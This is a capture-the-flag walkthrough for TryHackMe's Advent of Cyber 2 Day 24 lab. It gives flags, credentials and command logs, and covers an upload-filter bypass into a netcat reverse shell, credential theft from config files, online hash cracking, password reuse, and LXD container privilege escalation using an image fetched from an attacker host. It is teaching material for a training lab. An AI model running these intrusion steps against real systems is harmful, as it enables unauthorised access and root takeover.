# Day 24 - The Trial Before Christmas

**Date:** 24, December, 2020

**Author:** Dhilip Sanjay S

---

- Bypassing client side filters using BurpSuite
- Shell Upgrading and Stabilization
    - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
    - `export TERM=xterm` - this will give access to commands like `clear`.
    - Finally press `Ctrl + Z` and then type `stty raw -echo; fg`.

- MYSql:
    - `mysql -uUSERNAME -p`

- Online password cracking:
    - [CrackStation](https://crackstation.net/)
    - [MD5 Decrypt](https://md5decrypt.net/en/)
    - [Hashes](https://hashes.com/en/decrypt/hash)

- [Privilege Escalation with LXD](https://www.hackingarticles.in/lxd-privilege-escalation/)


## Solutions

### Scan the machine. What ports are open?
- **Answer:** 80, 65000
- **Steps to Reproduce:** 
    ```bash
    root@kali: nmap <MACHINE_IP>
    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-25 15:42 IST
    Nmap scan report for <MACHINE_IP>
    Host is up (0.17s latency).
    Not shown: 998 closed ports
    PORT      STATE SERVICE
    80/tcp    open  http
    65000/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds
    ```
---

### What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 
- **Answer:** Light Cycle
- **Steps to Reproduce:** Visit `http://<MACHINE_IP>:65000/`

---

### What is the name of the hidden php page?
- **Answer:** uploads.php
- **Steps to Reproduce:** 
    ```bash
    root@kali: gobuster dir -u http://<MACHINE_IP>:65000 -t 100 -w /usr/share/wordlists/dirb/common.txt -x .php | tee gobuster.txt
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://<MACHINE_IP>:65000
    [+] Threads:        100
    [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
    [+] Status codes:   200,204,301,302,307,401,403                                                                                                                                             
    [+] User Agent:     gobuster/3.0.1                                                                                                                                                          
    [+] Extensions: php                                                                                                                                                                     
    [+] Timeout:        10s                                                                                                                                                                     
    ===============================================================
    2020/12/25 15:56:42 Starting gobuster
    ===============================================================
    /.htaccess (Status: 403)
    /.htaccess.php (Status: 403)
    /.htpasswd (Status: 403)
    /.htpasswd.php (Status: 403)
    /.hta (Status: 403)
    /.hta.php (Status: 403)
    /api (Status: 301)
    /assets (Status: 301)
    /grid (Status: 301)
    /index.php (Status: 200)
    /index.php (Status: 200)
    /server-status (Status: 403)
    /uploads.php (Status: 200)
    ===============================================================
    2020/12/25 15:57:07 Finished
    ===============================================================
    ```
---

### What is the name of the hidden directory where file uploads are saved?
- **Answer:** grid
- **Steps to Reproduce:** Gobuster output.

---

### Bypass the filters. Upload and execute a reverse shell. 
- **Steps to Reproduce:** 
    - Upload `reverseShell.png.php` with any code for reverse shell.
    - Listen using netcat: `sudo nc -lvnp $port`

---

### What is the value of the web.txt flag?
- **Answer:** THM{ENTER_THE_GRID}
- **Steps to Reproduce:** 
    ```bash
    www-data@light-cycle:/$ find . -type f -name web.txt 2>/dev/null
    ./var/www/web.txt
    www-data@light-cycle:/$ cat /var/www/web.txt
    THM{ENTER_THE_GRID}
    ```
---

### Upgrade and stabilize your shell
- **Steps to Reproduce:** 
    ```bash
    $ python3 -c 'import pty;pty.spawn("/bin/bash")'
    www-data@light-cycle:/$ export TERM=xterm
    export TERM=xterm
    www-data@light-cycle:/$ ^Z
    [1]+  Stopped                 nc -lvnp 1234
    root@kali: stty raw -echo; fg
    nc -lvnp 1234
    ```
---

### Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
- **Answer:** tron:IFightForTheUsers
- **Steps to Reproduce:** 
    ```bash
    www-data@light-cycle:/$ cd /var/www/
    www-data@light-cycle:/var/www$ ls
    ENCOM  TheGrid  web.txt
    www-data@light-cycle:/var/www$ cd TheGrid/
    www-data@light-cycle:/var/www/TheGrid$ ls
    includes  public_html  rickroll.mp4
    www-data@light-cycle:/var/www/TheGrid$ ls -la
    total 15576
    drwxr-xr-x 4 root root     4096 Dec 16 22:34 .
    drwxr-xr-x 4 root root     4096 Dec 20 03:43 ..
    drwxr-xr-x 2 root root     4096 Dec 20 03:20 includes
    drwxr-xr-x 5 root root     4096 Dec 20 03:20 public_html
    -rw-r--r-- 1 root root 15929856 Dec 16 17:58 rickroll.mp4
    www-data@light-cycle:/var/www/TheGrid$ cd includes/
    www-data@light-cycle:/var/www/TheGrid/includes$ ls
    apiIncludes.php  dbauth.php  login.php  register.php  upload.php
    www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php 
    <?php
            $dbaddr = "localhost";
            $dbuser = "tron";
            $dbpass = "IFightForTheUsers";
            $database = "tron";

            $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);
            if($dbh->connect_error){
                    die($dbh->connect_error);
            }
    ?>
    ```
---

### Access the database and discover the encrypted credentials. What is the name of the database you find these in?
- **Answer:** tron
- **Steps to Reproduce:** 
    ```bash
    www-data@light-cycle:/var/www/TheGrid/includes$ mysql -utron -p
    Enter password: 
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 7
    Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

    Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    mysql> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | tron               |
    +--------------------+
    2 rows in set (0.02 sec)

    mysql> use tron
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> show tables;
    +----------------+
    | Tables_in_tron |
    +----------------+
    | users          |
    +----------------+
    1 row in set (0.00 sec)

    mysql> select * from users;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
    +----+----------+----------------------------------+
    1 row in set (0.00 sec)
    ```
---

### Crack the password. What is it?
- **Answer:** @computer@
- **Steps to Reproduce:** 
    - Use [Hashes decrypt](https://hashes.com/en/decrypt/hash)
    - `edc621628f6d19a13a00fd683f5e3ff7:@computer@`

---

### Use su to login to the newly discovered user by exploiting password reuse. 
- **Steps to Reproduce:** 
    ```bash
    www-data@light-cycle:/var/www/TheGrid/includes$ id       
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@light-cycle:/var/www/TheGrid/includes$ su flynn
    Password: 
    flynn@light-cycle:/var/www/TheGrid/includes$ id
    uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
    ```
---

### What is the value of the user.txt flag?
- **Answer:** THM{IDENTITY_DISC_RECOGNISED}
- **Steps to Reproduce:** 
    ```bash
    flynn@light-cycle:~$ ls
    user.txt
    flynn@light-cycle:~$ cat user.txt 
    THM{IDENTITY_DISC_RECOGNISED}
    ```
---

### Check the user's groups. Which group can be leveraged to escalate privileges? 
- **Answer:** lxd
- **Steps to Reproduce:** 
    ```bash
    flynn@light-cycle:/var/www/TheGrid/includes$ id
    uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
    ```
---

### Abuse this group to escalate privileges to root.
- **Steps to Reproduce:** 
 - In your attack machine:
    ```bash
    root@kali: git clone https://github.com/lxd-images/alpine-3-7-apache-php5-6
    Cloning into 'alpine-3-7-apache-php5-6'...
    remote: Enumerating objects: 9, done.
    remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 9
    Receiving objects: 100% (9/9), 12.41 MiB | 7.13 MiB/s, done.
    Resolving deltas: 100% (1/1), done.
    root@kali: cd alpine-3-7-apache-php5-6/
    root@kali:~/alpine-3-7-apache-php5-6# ls
    alpine-3-7-apache-php5-6.tar.bz2.000  image.yaml  import.sh  README.md
    root@kali:~/alpine-3-7-apache-php5-6# python -m SimpleHTTPServer
    Serving HTTP on 0.0.0.0 port 8000 ...
    ```

 - In the victim machine:
    ```bash
    flynn@light-cycle:/$ cd tmp/
    flynn@light-cycle:/tmp$ wget <YOUR_IP>:8000/alpine-3-7-apache-php5-6.tar.bz2.000
    --2020-12-25 12:59:22--  http://<YOUR_IP>:8000/alpine-3-7-apache-php5-6.tar.bz2.000
    Connecting to <YOUR_IP>:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 13019149 (12M) [application/octet-stream]
    Saving to: ‘alpine-3-7-apache-php5-6.tar.bz2.000’

    alpine-3-7-apache-p 100%[===================>]  12.42M  3.28MB/s    in 7.3s    

    2020-12-25 12:59:30 (1.69 MB/s) - ‘alpine-3-7-apache-php5-6.tar.bz2.000’ saved [13019149/13019149]
    flynn@light-cycle:/tmp$ lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias dsimage
    flynn@light-cycle:/tmp$ lxc image list
    +---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
    |  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE   |         UPLOAD DATE          |
    +---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
    | Alpine  | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB  | Dec 20, 2020 at 3:51am (UTC) |
    +---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
    | dsimage | 4d565cdcbaad | no     | Alpine-LAMP                   | x86_64 | 12.42MB | Dec 25, 2020 at 1:01pm (UTC) |
    +---------+--------------+--------+-------------------------------+--------+---------+------------------------------+

    flynn@light-cycle:/tmp$ lxc init dsimage dscontainer -c security.privileged=true
    Creating dscontainer
    flynn@light-cycle:/tmp$ lxc config device add dscontainer dsdevice disk source=/ path=/mnt/root recursive=true
    Device dsdevice added to dscontainer
    flynn@light-cycle:/tmp$ lxc start dscontainer
    flynn@light-cycle:/tmp$ lxc exec dscontainer /bin/sh
    ~ # whoami
    root
    ~ # id
    uid=0(root) gid=0(root)
    ```

---

### What is the value of the root.txt flag?
- **Answer:** THM{FLYNN_LIVES}
- **Steps to Reproduce:** 
```bash
~ # cd /mnt/root/root/
/mnt/root/root # cat root.txt
THM{FLYNN_LIVES}



"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"
```
---
[Back to Advent of Cyber 2](/TryHackMe/Advent%20of%20Cyber%202)
